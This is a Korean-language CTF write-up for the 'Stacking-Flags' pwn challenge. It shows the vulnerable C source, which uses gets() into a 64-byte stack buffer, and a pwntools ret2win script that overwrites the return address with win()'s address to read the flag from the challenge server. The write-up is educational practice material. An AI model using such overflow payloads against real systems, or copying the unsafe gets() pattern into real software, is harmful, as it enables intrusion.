---
ctf_name: "DawgCTF-2026"
challenge_name: "Stacking-Flags"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "kjs24"
date: "2026-04-13"
points: 100
tags: [bof]
---

# 문제명
Stacking-Flags

## 문제 설명

> A server at nc.umbccd.net:8921 is hosting the same code, but theirs has a flag, retrieve it.

- 문제 URL / 파일 등 접속 정보

## 풀이

### 분석

/*gcc -fno-stack-protector -no-pie -z execstack -g -Wno-implicit-function-declaration in.c -o out*/

#include <stdio.h>
#include <stdlib.h>

void win() {
    FILE *fp;
    char flag[128];

    fp = fopen("flag.txt", "r");
    
    if (!fp) {
        puts("Could not open flag file.");
        fflush(stdout);
        exit(1);
    }
    
    fgets(flag, sizeof(flag), fp);
    puts(flag);
    fflush(stdout);
    fclose(fp);
    exit(0);
}

void vulnerable_function() {
    char buffer[64];
    gets(buffer);
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    fflush(stdout);

    vulnerable_function();
    printf("win() is at: %p\n", win);
    printf("Better luck next time!\n");
    return 0;
}
win함수를 실행하면 플래그가 나옴
remote 환경에서의 libc 버전에 관해 주어진게 아무것도 없는데 win 주소를 프로그램에서 출력해줘 활용 가능
pie 없음



### 취약점

vulnerable_function() 함수에서 bof가 일어남 그래서 ret overwrite 가능
win함수 주소 leak
no-pie이기 떄문에 win함수 주소 고정이어서 그대로 활용가능
### 익스플로잇

풀이 과정을 단계별로 작성합니다.
1.nc nc.umbccd.net 8921 명령어를 통해 remote 환경의 win 주소를 확인한다.
2.vulnerable_function함수의 buffer를 채우고 sfp를 채울 64 + 8 패딩 그리고 win 함수의 주소를 붙여 페이로드를 구성한다.
3.vulnerable_funtion의 입력에 페이로드를 보내면 ret overwrite를 통해  vulnerable_funtion -> win 으로 점프

```python
from pwn import *


p = remote("nc.umbccd.net",8921)
context.log_level = "debug"
win_aadr = 0x4011a6

payload = b'A' *  64
payload += b'B' * 8
payload += p64(win_aadr) 

p.sendline(payload)

p.interactive()

```

## 플래그

```
DawgCTF{$ta********}
```

## 배운 점

이 문제를 통해 배운 내용을 정리합니다.
이 ctf는 오로지 소스코드만 주었기 때문에 gcc 버전이 달라 내가 컴파일 했을 때와 remote환경에서의 win 주소가 달라질 수 있을거라 예상해서 살짝 얼탔는데 생각해보니까 remote에서 한 번 실행시키고 win 주소 알아내면 되는걸 깨달았음.
